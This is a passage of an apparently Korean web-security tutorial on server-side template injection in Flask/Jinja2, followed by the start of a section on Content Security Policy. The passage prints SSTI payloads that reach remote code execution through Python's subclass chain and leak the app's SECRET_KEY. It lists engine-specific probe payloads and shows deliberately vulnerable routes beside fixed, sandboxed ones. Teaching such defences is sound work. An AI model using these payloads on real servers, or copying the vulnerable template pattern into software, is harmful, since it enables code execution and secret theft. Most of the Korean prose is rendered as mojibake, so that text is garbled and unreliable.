<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">{{</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="w"> </span><span class="err">}}</span><span class="w">                 </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="n">ëª¨ë“ </span><span class="w"> </span><span class="n">Python</span><span class="w"> </span><span class="n">í´ë˜ìŠ¤</span><span class="w"> </span><span class="n">ë‚˜ì—´</span><span class="w"> </span><span class="p">(</span><span class="n">RCEë¡œ</span><span class="w"> </span><span class="n">ê°€ëŠ”</span><span class="w"> </span><span class="n">ê²½ë¡œ</span><span class="p">)</span><span class="w">                     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">{{</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">[</span><span class="n">X</span><span class="o">]</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span><span class="w">          </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">       </span><span class="n">shell</span><span class="o">=</span><span class="k">True</span><span class="p">,</span><span class="w"> </span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">).</span><span class="n">communicate</span><span class="p">()</span><span class="w"> </span><span class="err">}}</span><span class="w">                    </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="n">ì›ê²©</span><span class="w"> </span><span class="n">ì½”ë“œ</span><span class="w"> </span><span class="n">ì‹¤í–‰</span><span class="err">!</span><span class="w">                                               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">ì˜í–¥ë°›ëŠ”</span><span class="w"> </span><span class="n">í…œí”Œë¦¿</span><span class="w"> </span><span class="nl">ì—”ì§„</span><span class="p">:</span><span class="w">                                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Jinja2</span><span class="w"> </span><span class="p">(</span><span class="n">Python</span><span class="o">/</span><span class="n">Flask</span><span class="p">)</span><span class="w">                                        </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Twig</span><span class="w"> </span><span class="p">(</span><span class="n">PHP</span><span class="p">)</span><span class="w">                                                    </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Freemarker</span><span class="w"> </span><span class="p">(</span><span class="n">Java</span><span class="p">)</span><span class="w">                                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Velocity</span><span class="w"> </span><span class="p">(</span><span class="n">Java</span><span class="p">)</span><span class="w">                                               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">ERB</span><span class="w"> </span><span class="p">(</span><span class="n">Ruby</span><span class="p">)</span><span class="w">                                                    </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Smarty</span><span class="w"> </span><span class="p">(</span><span class="n">PHP</span><span class="p">)</span><span class="w">                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<h3 id="72">7.2 ì·¨ì•½ ì½”ë“œì™€ ìˆ˜ì • ì½”ë“œ<a class="header-link" href="#72" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">ssti.py - Server-Side Template Injection ì·¨ì•½ì ê³¼ ë°©ì§€</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">render_template_string</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">jinja2.sandbox</span><span class="w"> </span><span class="kn">import</span> <span class="n">SandboxedEnvironment</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;super-secret-database-key-12345&#39;</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ì·¨ì•½: í…œí”Œë¦¿ ë¬¸ìì—´ì˜ ì‚¬ìš©ì ì…ë ¥</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/greet-vulnerable&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">greet_vulnerable</span><span class="p">():</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;World&#39;</span><span class="p">)</span>

    <span class="c1"># ì·¨ì•½: ì‚¬ìš©ì ì…ë ¥ì´ í…œí”Œë¦¿ì˜ ì¼ë¶€</span>
    <span class="n">template</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&lt;h1&gt;Hello </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">!&lt;/h1&gt;&quot;</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>

<span class="c1"># ê³µê²©: /greet-vulnerable?name={{ config[&#39;SECRET_KEY&#39;] }}</span>
<span class="c1"># ê²°ê³¼: &lt;h1&gt;Hello super-secret-database-key-12345!&lt;/h1&gt;</span>

<span class="c1"># ê³µê²©: /greet-vulnerable?name={{ &#39;&#39;.__class__.__mro__[1].__subclasses__() }}</span>
<span class="c1"># ê²°ê³¼: ëª¨ë“  Python í´ë˜ìŠ¤ ë‚˜ì—´, ì½”ë“œ ì‹¤í–‰ ê°€ëŠ¥</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/profile-vulnerable&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">profile_vulnerable</span><span class="p">():</span>
    <span class="c1"># ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ì‚¬ìš©ìê°€ ë§Œë“  í…œí”Œë¦¿ ë¡œë“œ</span>
    <span class="n">user_template</span> <span class="o">=</span> <span class="n">get_user_template</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span>

    <span class="c1"># ì·¨ì•½: ì‚¬ìš©ì ì œì–´ í…œí”Œë¦¿ ë‚´ìš©</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">user_template</span><span class="p">)</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ì·¨ì•½: ì˜¤ë¥˜ í˜ì´ì§€ì˜ í…œí”Œë¦¿</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">not_found_vulnerable</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">url</span>
    <span class="c1"># ì·¨ì•½: URLì´ í…œí”Œë¦¿ ë¬¸ìì—´ì— ë°˜ì˜ë¨</span>
    <span class="n">template</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">    &lt;html&gt;</span>
<span class="s2">    &lt;body&gt;</span>
<span class="s2">        &lt;h1&gt;Page Not Found&lt;/h1&gt;</span>
<span class="s2">        &lt;p&gt;The page </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2"> was not found.&lt;/p&gt;</span>
<span class="s2">    &lt;/body&gt;</span>
<span class="s2">    &lt;/html&gt;</span>
<span class="s2">    &quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">),</span> <span class="mi">404</span>

<span class="c1"># ê³µê²©: GET /{{config.items()}}</span>
<span class="c1"># 404 í•¸ë“¤ëŸ¬ê°€ config ë°ì´í„°ì™€ í•¨ê»˜ í…œí”Œë¦¿ì„ ë Œë”ë§</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ìˆ˜ì •: ì‚¬ìš©ì ì…ë ¥ì„ í…œí”Œë¦¿ ì½”ë“œê°€ ì•„ë‹Œ ë°ì´í„°ë¡œ ì „ë‹¬</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/greet-secure&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">greet_secure</span><span class="p">():</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;World&#39;</span><span class="p">)</span>

    <span class="c1"># ìˆ˜ì •: ì‚¬ìš©ì ì…ë ¥ì´ ë°ì´í„° ë§¤ê°œë³€ìˆ˜ë¡œ ì „ë‹¬ë¨</span>
    <span class="c1"># Jinja2ëŠ” ë³€ìˆ˜ì¼ ë•Œ {{ name }}ì„ ìë™ ì´ìŠ¤ì¼€ì´í”„</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span>
        <span class="s2">&quot;&lt;h1&gt;Hello {{ name }}!&lt;/h1&gt;&quot;</span><span class="p">,</span>
        <span class="n">name</span><span class="o">=</span><span class="n">name</span>  <span class="c1"># ì´ê²ƒì€ í…œí”Œë¦¿ ì½”ë“œê°€ ì•„ë‹Œ ë°ì´í„°</span>
    <span class="p">)</span>

<span class="c1"># ì…ë ¥: {{ config[&#39;SECRET_KEY&#39;] }}</span>
<span class="c1"># ì¶œë ¥: &lt;h1&gt;Hello {{ config[&amp;#39;SECRET_KEY&amp;#39;] }}!&lt;/h1&gt;</span>
<span class="c1"># ì‹¤í–‰ë˜ì§€ ì•Šê³  í…ìŠ¤íŠ¸ë¡œ ë Œë”ë§ë¨!</span>


<span class="c1"># ìµœì„ : render_template_stringì´ ì•„ë‹Œ ë³„ë„ í…œí”Œë¦¿ íŒŒì¼ ì‚¬ìš©</span>
<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/greet-best&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">greet_best</span><span class="p">():</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;World&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;greet.html&#39;</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="p">)</span>
    <span class="c1"># greet.html: &lt;h1&gt;Hello {{ name }}!&lt;/h1&gt;</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">not_found_secure</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
    <span class="c1"># ìˆ˜ì •: URLì´ í…œí”Œë¦¿ì— í¬í•¨ë˜ì§€ ì•Šê³  ë°ì´í„°ë¡œ ì „ë‹¬ë¨</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        &lt;html&gt;</span>
<span class="sd">        &lt;body&gt;</span>
<span class="sd">            &lt;h1&gt;Page Not Found&lt;/h1&gt;</span>
<span class="sd">            &lt;p&gt;The requested page was not found.&lt;/p&gt;</span>
<span class="sd">        &lt;/body&gt;</span>
<span class="sd">        &lt;/html&gt;</span>
<span class="sd">        &quot;&quot;&quot;</span><span class="p">,</span>
    <span class="p">),</span> <span class="mi">404</span>
    <span class="c1"># ì°¸ê³ : ì˜¤ë¥˜ í˜ì´ì§€ì— URLë„ í¬í•¨í•˜ì§€ ì•ŠìŒ (ì •ë³´ ìœ ì¶œ)</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ì‚¬ìš©ì ìƒì„± í…œí”Œë¦¿ì´ í•„ìš”í•œ ê²½ìš°: ìƒŒë“œë°•ìŠ¤ ì‚¬ìš©</span>
<span class="c1"># ==============================================================</span>

<span class="k">def</span><span class="w"> </span><span class="nf">render_user_template_safe</span><span class="p">(</span><span class="n">template_str</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">context</span><span class="p">:</span> <span class="nb">dict</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    ìƒŒë“œë°•ìŠ¤ í™˜ê²½ì—ì„œ ì‚¬ìš©ì ì œê³µ í…œí”Œë¦¿ ë Œë”ë§.</span>
<span class="sd">    ìœ„í—˜í•œ ì†ì„± ë° ë©”ì„œë“œì— ëŒ€í•œ ì ‘ê·¼ ì œí•œ.</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="c1"># ìƒŒë“œë°•ìŠ¤ í™˜ê²½ì€ ì†ì„± ì ‘ê·¼ ì œí•œ</span>
    <span class="n">sandbox</span> <span class="o">=</span> <span class="n">SandboxedEnvironment</span><span class="p">()</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">template</span> <span class="o">=</span> <span class="n">sandbox</span><span class="o">.</span><span class="n">from_string</span><span class="p">(</span><span class="n">template_str</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">template</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="o">**</span><span class="n">context</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
        <span class="k">return</span> <span class="s2">&quot;&lt;p&gt;Error rendering template&lt;/p&gt;&quot;</span>

<span class="c1"># ìƒŒë“œë°•ìŠ¤ê°€ ë°©ì§€í•˜ëŠ” ê²ƒ:</span>
<span class="c1"># - __class__, __mro__, __subclasses__ ì ‘ê·¼</span>
<span class="c1"># - ìœ„í—˜í•œ í•¨ìˆ˜ í˜¸ì¶œ</span>
<span class="c1"># - config ë˜ëŠ” ê¸°íƒ€ ì•± ë‚´ë¶€ ì ‘ê·¼</span>
<span class="c1"># í•˜ì§€ë§Œ ì—¬ì „íˆ 100% ì•ˆì „í•˜ì§€ ì•ŠìŒ - ì‚¬ìš©ì í…œí”Œë¦¿ì„ ì™„ì „íˆ í”¼í•˜ëŠ” ê²ƒì´ ì¢‹ìŒ</span>
</code></pre></div>

<h3 id="73-ssti">7.3 SSTI íƒì§€ ì¹˜íŠ¸ ì‹œíŠ¸<a class="header-link" href="#73-ssti" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="x">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="x">â”‚          í…œí”Œë¦¿ ì—”ì§„ë³„ SSTI íƒì§€                                  â”‚</span>
<span class="x">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="x">â”‚                                                                  â”‚</span>
<span class="x">â”‚  ë²”ìš© í…ŒìŠ¤íŠ¸ í˜ì´ë¡œë“œ: ${7*7} ë° {{7*7}}                         â”‚</span>
<span class="x">â”‚  ë‘˜ ì¤‘ í•˜ë‚˜ê°€ &quot;49&quot;ë¡œ ë Œë”ë§ë˜ë©´ ì•±ì´ ì·¨ì•½í•¨                       â”‚</span>
<span class="x">â”‚                                                                  â”‚</span>
<span class="x">â”‚  ì—”ì§„ë³„ íƒì§€:                                                    â”‚</span>
<span class="x">â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”             â”‚</span>
<span class="x">â”‚  â”‚ ì—”ì§„         â”‚ í…ŒìŠ¤íŠ¸ í˜ì´ë¡œë“œ      â”‚ ì¶œë ¥    â”‚              â”‚</span>
<span class="x">â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤             â”‚</span>
<span class="x">â”‚  â”‚ Jinja2       â”‚ {{7*&#39;7&#39;}}            â”‚ 7777777 â”‚              â”‚</span>
<span class="x">â”‚  â”‚ Twig         â”‚ {{7*&#39;7&#39;}}            â”‚ 49      â”‚              â”‚</span>
<span class="x">â”‚  â”‚ Freemarker   â”‚ ${7*7}               â”‚ 49      â”‚              â”‚</span>
<span class="x">â”‚  â”‚ ERB (Ruby)   â”‚ </span><span class="cp">&lt;%=</span><span class="w"> </span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="w"> </span><span class="cp">%&gt;</span><span class="x">           â”‚ 49      â”‚              â”‚</span>
<span class="x">â”‚  â”‚ Smarty       â”‚ {7*7}                â”‚ 49      â”‚              â”‚</span>
<span class="x">â”‚  â”‚ Velocity     â”‚ #set($x=7*7)${x}    â”‚ 49      â”‚              â”‚</span>
<span class="x">â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜             â”‚</span>
<span class="x">â”‚                                                                  â”‚</span>
<span class="x">â”‚  ë°©ì§€ (ëª¨ë“  ì—”ì§„):                                               â”‚</span>
<span class="x">â”‚  1. ì‚¬ìš©ì ì…ë ¥ì„ í…œí”Œë¦¿ì— ë„£ì§€ ì•Šê¸°                             â”‚</span>
<span class="x">â”‚  2. í•­ìƒ ì‚¬ìš©ì ì…ë ¥ì„ í…œí”Œë¦¿ ë³€ìˆ˜ë¡œ ì „ë‹¬                        â”‚</span>
<span class="x">â”‚  3. ì‚¬ìš©ì í…œí”Œë¦¿ì´ í•„ìš”í•œ ê²½ìš° ìƒŒë“œë°•ìŠ¤ í…œí”Œë¦¿ í™˜ê²½ ì‚¬ìš©        â”‚</span>
<span class="x">â”‚  4. ê°€ëŠ¥í•˜ë©´ ë¡œì§ ì—†ëŠ” í…œí”Œë¦¿ ì‚¬ìš© (Mustache)                   â”‚</span>
<span class="x">â”‚                                                                  â”‚</span>
<span class="x">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<hr />
<h2 id="8-content-security-policy-csp">8. Content Security Policy (CSP)<a class="header-link" href="#8-content-security-policy-csp" title="Permanent link">&para;</a></h2>
<h3 id="81-csp">8.1 ë°©ì–´ ê³„ì¸µìœ¼ë¡œì„œì˜ CSP<a class="header-link" href="#81-csp" title="Permanent link">&para;</a></h3>
<p>Content Security PolicyëŠ” ë¸Œë¼ìš°ì €ì— ìŠ¹ì¸ëœ ì¶œì²˜ì—ì„œë§Œ ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•˜ë„ë¡ ì§€ì‹œí•˜ëŠ” HTTP í—¤ë”ì…ë‹ˆë‹¤. XSSì— ëŒ€í•œ ê°€ì¥ íš¨ê³¼ì ì¸ ì‹¬ì¸µ ë°©ì–´ì…ë‹ˆë‹¤.</p>
<div class="highlight"><pre><span></span><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚<span class="w">              </span>Content<span class="w"> </span>Security<span class="w"> </span>Policy<span class="w">                             </span>â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>CSP<span class="w"> </span>ì—†ì´:<span class="w">                                                       </span>â”‚
â”‚<span class="w">  </span>ì£¼ì…ëœ<span class="w"> </span>ê²ƒì„<span class="w"> </span>í¬í•¨í•˜ì—¬<span class="w"> </span>ëª¨ë“ <span class="w"> </span><span class="nt">&lt;script&gt;</span><span class="w"> </span>íƒœê·¸ê°€<span class="w"> </span>ì‹¤í–‰ë¨<span class="w">                 </span>â”‚
â”‚<span class="w">  </span><span class="nt">&lt;script&gt;</span>malicious_code()<span class="nt">&lt;/script&gt;</span><span class="w">  </span>â†’<span class="w"> </span>ì‹¤í–‰<span class="w">                      </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>CSPì™€<span class="w"> </span>í•¨ê»˜:<span class="w">                                                     </span>â”‚
â”‚<span class="w">  </span>ë¸Œë¼ìš°ì €ê°€<span class="w"> </span>ì •ì±…ê³¼<span class="w"> </span>ì¼ì¹˜í•˜ì§€<span class="w"> </span>ì•ŠëŠ”<span class="w"> </span>ìŠ¤í¬ë¦½íŠ¸<span class="w"> </span>ì°¨ë‹¨<span class="w">                    </span>â”‚
â”‚<span class="w">  </span><span class="nt">&lt;script&gt;</span>malicious_code()<span class="nt">&lt;/script&gt;</span><span class="w">  </span>â†’<span class="w"> </span>ì°¨ë‹¨ë¨<span class="w">                    </span>â”‚
â”‚<span class="w">  </span>(ì¸ë¼ì¸<span class="w"> </span>ìŠ¤í¬ë¦½íŠ¸ê°€<span class="w"> </span>CSP<span class="w"> </span>í—ˆìš©<span class="w"> </span>ëª©ë¡ì—<span class="w"> </span>ì—†ê¸°<span class="w"> </span>ë•Œë¬¸)<span class="w">                    </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>CSP<span class="w"> </span>ì§€ì‹œë¬¸:<span class="w">                                                     </span>â”‚
â”‚<span class="w">  </span>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>ì§€ì‹œë¬¸<span class="w">           </span>â”‚<span class="w"> </span>ì œì–´<span class="w">                              </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>default-src<span class="w">      </span>â”‚<span class="w"> </span>ëª¨ë“ <span class="w"> </span>ë¦¬ì†ŒìŠ¤<span class="w"> </span>ìœ í˜•ì˜<span class="w"> </span>í´ë°±<span class="w">           </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>script-src<span class="w">       </span>â”‚<span class="w"> </span>JavaScript<span class="w"> </span>ì¶œì²˜<span class="w">                   </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>style-src<span class="w">        </span>â”‚<span class="w"> </span>CSS<span class="w"> </span>ì¶œì²˜<span class="w">                          </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>img-src<span class="w">          </span>â”‚<span class="w"> </span>ì´ë¯¸ì§€<span class="w"> </span>ì¶œì²˜<span class="w">                       </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>font-src<span class="w">         </span>â”‚<span class="w"> </span>í°íŠ¸<span class="w"> </span>ì¶œì²˜<span class="w">                         </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>connect-src<span class="w">      </span>â”‚<span class="w"> </span>AJAX,<span class="w"> </span>WebSocket,<span class="w"> </span>EventSource<span class="w">      </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>frame-src<span class="w">        </span>â”‚<span class="w"> </span>iframe<span class="w"> </span>ì¶œì²˜<span class="w">                       </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>media-src<span class="w">        </span>â”‚<span class="w"> </span>ì˜¤ë””ì˜¤/ë¹„ë””ì˜¤<span class="w"> </span>ì¶œì²˜<span class="w">                </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>object-src<span class="w">       </span>â”‚<span class="w"> </span>í”ŒëŸ¬ê·¸ì¸<span class="w"> </span>(Flash,<span class="w"> </span>Java)<span class="w">            </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>form-action<span class="w">      </span>â”‚<span class="w"> </span>í¼<span class="w"> </span>ì œì¶œ<span class="w"> </span>ëŒ€ìƒ<span class="w">                      </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>frame-ancestors<span class="w">  </span>â”‚<span class="w"> </span>ì´<span class="w"> </span>í˜ì´ì§€ë¥¼<span class="w"> </span>í¬í•¨í• <span class="w"> </span>ìˆ˜<span class="w"> </span>ìˆëŠ”<span class="w"> </span>ëŒ€ìƒ<span class="w">   </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>base-uri<span class="w">         </span>â”‚<span class="w"> </span><span class="nt">&lt;base&gt;</span><span class="w"> </span>íƒœê·¸<span class="w"> </span>ì œí•œ<span class="w">                  </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>report-uri<span class="w">       </span>â”‚<span class="w"> </span>ìœ„ë°˜<span class="w"> </span>ë³´ê³ ì„œë¥¼<span class="w"> </span>ë³´ë‚¼<span class="w"> </span>ìœ„ì¹˜<span class="w">           </span>â”‚<span class="w">       </span>â”‚
